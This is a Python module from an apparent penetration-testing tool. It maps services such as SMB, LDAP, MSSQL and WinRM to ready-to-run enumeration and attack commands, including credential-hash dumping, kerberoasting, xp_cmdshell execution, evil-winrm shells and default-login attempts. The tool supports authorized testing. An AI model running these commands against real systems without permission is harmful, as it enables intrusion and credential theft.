"""Protocol-specific enumeration knowledge.

Each service maps to a set of EnumSteps: the next investigation to run, *why*
it matters, and *what evidence in the output* justifies going further. Modelled
on nxc_plus depth. Credentialed steps activate only when creds are supplied;
``exam_safe`` gates lab-only actions out of the default profile.
"""
from __future__ import annotations
from ..core.models import EnumStep, Service

# nmap names services by alias; map them to a canonical protocol key
_ALIAS = {
    "microsoft-ds": "smb", "netbios-ssn": "smb", "ms-sql-s": "mssql", "ms-sql": "mssql",
    "ms-wbt-server": "rdp", "mariadb": "mysql", "domain": "dns", "smtps": "smtp",
    "submission": "smtp", "imaps": "imap", "ldapssl": "ldap", "globalcatldap": "ldap",
    "globalcatldapssl": "ldap", "wsman": "winrm", "wsmans": "winrm",
}
_PORT = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns", 110: "pop3", 111: "nfs",
    139: "smb", 143: "imap", 161: "snmp", 389: "ldap", 443: "http", 445: "smb",
    636: "ldap", 1433: "mssql", 2049: "nfs", 3268: "ldap", 3306: "mysql", 3389: "rdp",
    5432: "postgres", 5985: "winrm", 5986: "winrm", 5900: "vnc",
}
_WEB_PORTS = {80, 443, 8080, 8443, 8000, 8888, 8081, 7001, 9090, 3000}


def protocol_key(svc: Service) -> str:
    n = svc.name.lower()
    if n in _ALIAS:
        return _ALIAS[n]
    for key in STEPS:
        if key in n:
            return key
    if svc.port in _PORT:
        return _PORT[svc.port]
    if svc.port in _WEB_PORTS or "http" in n:
        return "http"
    if "mariadb" in svc.banner.lower():
        return "mysql"
    return ""


def S(what, cmd, why="", look_for="", needs_creds=False, exam_safe=True):
    return EnumStep(what=what, command=cmd, why=why, look_for=look_for,
                    needs_creds=needs_creds, exam_safe=exam_safe)


STEPS: dict[str, list[EnumStep]] = {
 "smb": [
    S("null-session enumeration", "nxc smb {ip} -u '' -p '' --shares --users --rid-brute",
      "unauthenticated SMB often leaks shares, the user list and the domain",
      "readable shares, a user list to spray, the domain/workgroup name"),
    S("guest fallback", "nxc smb {ip} -u 'guest' -p '' --shares",
      "guest is enabled on many boxes when null is not", "any READ/WRITE share"),
    S("signing / OS / domain", "nxc smb {ip}",
      "SMB signing 'not required' = relay target; OS hints at MS17-010 era",
      "signing:False, Windows build, domain name"),
    S("EternalBlue check", "nmap -p445 --script smb-vuln-ms17-010 {ip}",
      "unauth RCE on unpatched 2008/2012/Win7", "VULNERABLE"),
    S("spider readable shares", "nxc smb {ip} -u USER -p PASS -M spider_plus",
      "configs/scripts in shares frequently hold creds", "*.config, *.ps1, unattend.xml",
      needs_creds=True),
    S("dump local hashes (if admin)", "nxc smb {ip} -u USER -p PASS --sam --lsa",
      "local admin -> SAM/LSA secrets -> lateral creds", "NTLM hashes, LSA plaintext",
      needs_creds=True),
 ],
 "ldap": [
    S("anonymous RootDSE", "ldapsearch -x -H ldap://{ip} -s base namingContexts",
      "RootDSE is usually world-readable and reveals the base DN + domain", "defaultNamingContext"),
    S("anonymous user dump", "nxc ldap {ip} -u '' -p '' --users",
      "some DCs allow anonymous user enumeration", "sAMAccountName list"),
    S("AS-REP roast (no creds needed)", "nxc ldap {ip} -u users.txt -p '' --asreproast out.asrep",
      "accounts without pre-auth yield crackable hashes unauthenticated", "krb5asrep$ hashes"),
    S("kerberoast (authed)", "nxc ldap {ip} -u USER -p PASS --kerberoasting out.kerb",
      "service accounts -> crackable TGS hashes", "krb5tgs$ hashes", needs_creds=True),
    S("BloodHound collection (authed)", "nxc ldap {ip} -u USER -p PASS --bloodhound -c all",
      "maps the shortest path to Domain Admin", "graph data for BloodHound", needs_creds=True),
 ],
 "http": [
    S("content discovery", "feroxbuster -u {url} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
      "hidden endpoints/admin panels are the usual foothold", "200/301/403 on admin, backups, uploads"),
    S("quick wins", "curl -s {url}/robots.txt ; curl -s {url}/.git/HEAD ; curl -sI {url}",
      "robots, exposed .git, and headers are free intel", "disallowed paths, .git, tech headers"),
    S("HTTP methods", "curl -sI -X OPTIONS {url}/",
      "PUT/DELETE enabled = file upload", "Allow: PUT"),
    S("vhost discovery", "ffuf -u {url}/ -H 'Host: FUZZ.DOMAIN' -w subdomains.txt -fs 0",
      "name-based vhosts hide separate apps", "responses differing from the default"),
    S("tech/CMS fingerprint", "whatweb {url} ; nuclei -u {url} -t http/technologies (LAB only)",
      "exact product+version drives the CVE lookup", "product and version strings"),
 ],
 "ssh": [
    S("banner + auth methods", "ssh -v {ip} 2>&1 | grep -i 'auth\\|remote'",
      "version drives CVE lookup; allowed methods show if password/key", "OpenSSH version, auth list"),
    S("key-based / found creds", "ssh USER@{ip}",
      "prefer creds you already recovered over brute force", "a shell", needs_creds=True),
 ],
 "ftp": [
    S("anonymous login", "ftp {ip}   # anonymous / anything",
      "anonymous FTP is common and may be writable", "230 login ok, writable dirs"),
    S("mirror if anonymous", "wget -m --no-passive ftp://anonymous:anonymous@{ip}/",
      "pull everything for offline review", "configs, source, creds"),
 ],
 "mssql": [
    S("login + version", "nxc mssql {ip} -u sa -p '' --local-auth",
      "sa with blank/default password is common", "login success, @@version"),
    S("command exec (authed sysadmin)", "nxc mssql {ip} -u sa -p PASS -x whoami --local-auth",
      "xp_cmdshell = RCE when you are sysadmin", "command output", needs_creds=True),
 ],
 "mysql": [
    S("root login", "mysql -h {ip} -u root",
      "blank root password is common on lab DBs", "mysql> prompt"),
    S("version + grants (authed)", "mysql -h {ip} -u USER -pPASS -e 'select version(); show grants;'",
      "FILE priv -> read/write files -> webshell", "FILE privilege", needs_creds=True),
 ],
 "rdp": [
    S("NLA / cred check", "nxc rdp {ip} -u USER -p PASS",
      "confirms creds and whether NLA is enforced", "Pwn3d! or valid"),
    S("BlueKeep check (old)", "nmap -p3389 --script rdp-vuln-ms12-020 {ip}",
      "unauth RCE on unpatched 2008/Win7", "VULNERABLE"),
 ],
 "winrm": [
    S("cred check", "nxc winrm {ip} -u USER -p PASS",
      "WinRM + valid creds = interactive shell", "Pwn3d!", needs_creds=True),
    S("shell (authed)", "evil-winrm -i {ip} -u USER -p PASS",
      "turn valid WinRM creds into a shell", "PS prompt", needs_creds=True),
 ],
 "dns": [
    S("zone transfer", "dig axfr @{ip} DOMAIN",
      "AXFR leaks the whole internal namespace", "a full record dump"),
 ],
 "smtp": [
    S("user enumeration", "smtp-user-enum -M RCPT -U users.txt -t {ip}",
      "valid mailboxes = valid domain users", "250 for valid users"),
    S("open relay", "nmap -p25 --script smtp-open-relay {ip}",
      "relays help phishing/footholds", "relay allowed"),
 ],
 "snmp": [
    S("community + walk", "onesixtyone {ip} public ; snmpwalk -v2c -c public {ip}",
      "'public' often exposes processes, users, even creds", "running procs, shares, creds"),
 ],
 "nfs": [
    S("list + mount exports", "showmount -e {ip}",
      "world-readable exports leak files and keys", "exports with no_root_squash"),
 ],
 "pop3": [S("banner / login", "nc {ip} 110", "version + creds reuse", "product/version")],
 "imap": [S("banner / login", "nc {ip} 143", "version + creds reuse", "product/version")],
 "telnet": [S("banner / weak creds", "telnet {ip}", "cleartext; try admin/admin, root/root", "login prompt")],
 "vnc": [S("auth check", "nxc vnc {ip}", "often no/weak auth", "no-auth or weak password")],
 "postgres": [S("default login", "psql -h {ip} -U postgres", "postgres/postgres is common", "psql prompt")],
}


def build_steps(svc: Service, *, has_creds: bool = False, lab: bool = False) -> list[EnumStep]:
    key = protocol_key(svc)
    out = []
    for st in STEPS.get(key, []):
        if st.needs_creds and not has_creds:
            continue
        if not st.exam_safe and not lab:
            continue
        cmd = (st.command.replace("{ip}", svc.host_ip or "TARGET")
                         .replace("{port}", str(svc.port))
                         .replace("{url}", f"{'https' if svc.port in (443,8443) else 'http'}://{svc.host_ip or 'TARGET'}:{svc.port}"))
        out.append(EnumStep(st.what, cmd, st.why, st.look_for, st.needs_creds, st.exam_safe))
    return out
